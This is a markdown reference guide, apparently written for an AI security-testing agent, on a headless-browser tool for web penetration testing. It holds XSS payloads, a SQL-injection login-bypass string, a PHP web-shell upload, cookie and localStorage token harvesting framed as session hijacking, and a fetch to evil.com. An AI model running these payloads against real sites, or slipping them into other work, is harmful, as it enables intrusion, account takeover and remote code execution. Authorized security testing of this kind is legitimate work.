<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

# Browser Automation for Security Testing

## Overview
The browser automation tool (`browser_action`) provides headless Chromium control for security testing. It can be used for:
- Interactive web testing
- XSS verification
- RCE proof-of-concept
- Session hijacking
- DOM analysis
- JavaScript error detection
- Source code inspection

## Available Actions

### Navigation
```python
browser_action(action="goto", url="https://target.com")
browser_action(action="back")
browser_action(action="forward")
browser_action(action="new_tab", url="https://target.com")
browser_action(action="switch_tab", tab_id="tab_123")
browser_action(action="close_tab", tab_id="tab_123")
browser_action(action="list_tabs")
```

### Interaction
```python
# Click at coordinates (x,y) - use to find coordinates first
browser_action(action="click", coordinate="200,150", tab_id="main")

# Type text into focused element
browser_action(action="type", text="admin", tab_id="main")
browser_action(action="type", text="password123", tab_id="main")

# Double click
browser_action(action="double_click", coordinate="200,150")

# Hover over element
browser_action(action="hover", coordinate="200,150")

# Press keyboard key
browser_action(action="press_key", key="Enter")
browser_action(action="press_key", key="Tab")
browser_action(action="press_key", key="Escape")
browser_action(action="press_key", key="F12")

# Scroll
browser_action(action="scroll_down")
browser_action(action="scroll_up")
```

### JavaScript Execution
```python
# Execute custom JavaScript
browser_action(action="execute_js", js_code="document.cookie", tab_id="main")

# Test XSS - alert popup
browser_action(action="execute_js", js_code="alert(document.domain)", tab_id="main")

# Test XSS - console log
browser_action(action="execute_js", js_code="console.log('XSS TEST')", tab_id="main")

# Get all cookies
browser_action(action="execute_js", js_code="document.cookie", tab_id="main")

# Get localStorage
browser_action(action="execute_js", js_code="JSON.stringify(localStorage)", tab_id="main")

# Get sessionStorage
browser_action(action="execute_js", js_code="JSON.stringify(sessionStorage)", tab_id="main")

# Check if element exists
browser_action(action="execute_js", js_code="document.querySelector('#admin') !== null", tab_id="main")

# Get form values
browser_action(action="execute_js", js_code="document.getElementById('username').value", tab_id="main")

# Test for DOM XSS - source
browser_action(action="execute_js", js_code="location.hash", tab_id="main")

# Test for DOM XSS - sink
browser_action(action="execute_js", js_code="document.write('<img src=x onerror=alert(1)>')", tab_id="main")

# Bypass client-side validation
browser_action(action="execute_js", js_code="document.getElementById('password').disabled = false", tab_id="main")

# Export data
browser_action(action="execute_js", js_code="document.body.innerHTML", tab_id="main")
```

### Analysis
```python
# Get console logs (JavaScript errors)
browser_action(action="get_console_logs", tab_id="main")
browser_action(action="get_console_logs", clear=True, tab_id="main")

# View page source
browser_action(action="view_source", tab_id="main")

# Save as PDF
browser_action(action="save_pdf", file_path="/workspace/target/page.pdf", tab_id="main")

# Wait for page load
browser_action(action="wait", duration=3.0, tab_id="main")
```

## Security Testing Use Cases

### 1. XSS Verification
```python
# Navigate to potential XSS parameter
browser_action(action="goto", url="https://target.com/search?q=test")

# Test for reflected XSS
browser_action(action="execute_js", js_code="alert('XSS')")

# Test for stored XSS (after form submission)
browser_action(action="goto", url="https://target.com/comment")
browser_action(action="type", text="<img src=x onerror=alert(1)>")
browser_action(action="click", coordinate="submit_button_coords")

# Verify with console logs
browser_action(action="get_console_logs", tab_id="main")
```

### 2. Authentication Testing
```python
# Test login page
browser_action(action="goto", url="https://target.com/login")
browser_action(action="type", text="admin")
browser_action(action="press_key", key="Tab")
browser_action(action="type", text="password")
browser_action(action="press_key", key="Enter")

# Check for auth tokens
browser_action(action="execute_js", js_code="document.cookie", tab_id="main")
```

### 3. IDOR Testing
```python
# Login as user1
browser_action(action="goto", url="https://target.com/login")
browser_action(action="type", text="user1")

# Navigate to user1's profile
browser_action(action="goto", url="https://target.com/profile/1")

# Try to access user2's profile (IDOR test)
browser_action(action="goto", url="https://target.com/profile/2")

# Check if unauthorized access works
browser_action(action="execute_js", js_code="document.body.innerText", tab_id="main")
```

### 4. Session Hijacking
```python
# Get session cookie
browser_action(action="execute_js", js_code="document.cookie", tab_id="main")

# Get localStorage with tokens
browser_action(action="execute_js", js_code="localStorage.getItem('token')", tab_id="main")

# Clone session (manual - copy cookie values)
```

### 5. DOM Analysis
```python
# Get all forms
browser_action(action="execute_js", js_code="document.querySelectorAll('form').length", tab_id="main")

# Get all links
browser_action(action="execute_js", js_code="document.querySelectorAll('a').length", tab_id="main")

# Find hidden inputs
browser_action(action="execute_js", js_code="[...document.querySelectorAll('input[type=hidden]')].map(i=>i.name)", tab_id="main")

# Check CORS
browser_action(action="execute_js", js_code="fetch('https://evil.com').catch(e=>e.message)", tab_id="main")

# Check CSP
browser_action(action="execute_js", js_code="document.securityPolicy", tab_id="main")
```

### 6. WebSocket Testing
```python
# Check for WebSocket connections
browser_action(action="execute_js", js_code="window.ws = new WebSocket('ws://target.com'); window.ws.onmessage = m => console.log(m.data)", tab_id="main")

# Send test message
browser_action(action="execute_js", js_code="window.ws.send('test')", tab_id="main")
```

### 7. RCE Proof-of-Concept
```python
# Test command injection in webapp
browser_action(action="goto", url="https://target.com/ping?host=127.0.0.1")

# For RCE via file upload
browser_action(action="goto", url="https://target.com/upload")
browser_action(action="execute_js", js_code="document.querySelector('input[type=file]').files = [new File(['<?php system($_GET[\"cmd\"]); ?>'], 'shell.php', {type: 'application/php'})]", tab_id="main")
```

### 8. Clickjacking Test
```python
# Get page dimensions
browser_action(action="execute_js", js_code="window.innerWidth + 'x' + window.innerHeight", tab_id="main")

# Check if site can be framed
browser_action(action="execute_js", js_code="window.self === window.top", tab_id="main")
```

### 9. Information Disclosure
```python
# Check for sensitive data in source
browser_action(action="view_source", tab_id="main")

# Check console for errors
browser_action(action="get_console_logs", tab_id="main")

# Check for API keys in localStorage
browser_action(action="execute_js", js_code="Object.keys(localStorage).filter(k=>k.match(/key|token|secret|api/gi))", tab_id="main")
```

### 10. Multi-Step Testing
```python
# Complete checkout flow
browser_action(action="goto", url="https://target.com/cart")
browser_action(action="type", text="product_id")
browser_action(action="click", coordinate="add_to_cart_coords")
browser_action(action="goto", url="https://target.com/checkout")
browser_action(action="type", text="credit_card_number")
browser_action(action="execute_js", js_code="document.querySelector('form').submit()", tab_id="main")
```

## Workflow Examples

### XSS Testing Workflow
```
1. browser_action(action="goto", url="TARGET_URL")
2. browser_action(action="execute_js", js_code="document.body.innerHTML", tab_id="main") # Get page content
3. browser_action(action="get_console_logs", tab_id="main") # Check for JS errors
4. browser_action(action="execute_js", js_code="alert(document.domain)", tab_id="main") # Test XSS
5. browser_action(action="view_source", tab_id="main") # Analyze source
```

### Login Bypass Workflow
```
1. browser_action(action="goto", url="TARGET/login")
2. browser_action(action="type", text="admin' OR '1'='1")
3. browser_action(action="press_key", key="Tab")
4. browser_action(action="type", text="anypassword")
5. browser_action(action="press_key", key="Enter")
6. browser_action(action="execute_js", js_code="document.cookie", tab_id="main") # Check if logged in
```

### API Testing Workflow
```
1. browser_action(action="goto", url="TARGET/api/docs")
2. browser_action(action="view_source", tab_id="main") # Get API schema
3. browser_action(action="execute_js", js_code="fetch('/api/users').then(r=>r.text()).then(console.log)", tab_id="main") # Test API
```

## Best Practices

1. **Always check console logs** after navigation - errors reveal vulnerabilities
2. **Use execute_js** to test XSS rather than just observing reflected parameters
3. **Check both client-side and server-side** responses
4. **Test authentication** with browser rather than just curl (some apps check JS)
5. **Use view_source** to see actual rendered HTML vs DevTools
6. **Scroll through pages** to trigger lazy-loaded content
7. **Wait** between actions for JavaScript to execute

## Finding Element Coordinates

To find click coordinates:
1. Open browser DevTools (F12)
2. Hover over element
3. Note the coordinates shown in DevTools
4. Or use: `browser_action(action="execute_js", js_code="document.elementFromPoint(x,y).tagName")`

## Common Issues

- **Element not clickable**: Use scroll first or click at different coordinates
- **Type not working**: Make sure element is focused, use click first
- **JS not executing**: Page may have CSP - try different approach
- **Console empty**: Clear logs first with `clear=True`

## Integration with Other Tools

Use browser AFTER:
- `nuclei` - finds potential XSS endpoints
- `ffuf` - finds hidden parameters
- `sqlmap` - for SQL injection verification

Use browser BEFORE:
- Manual exploitation
- Session testing
- Multi-step flow testing
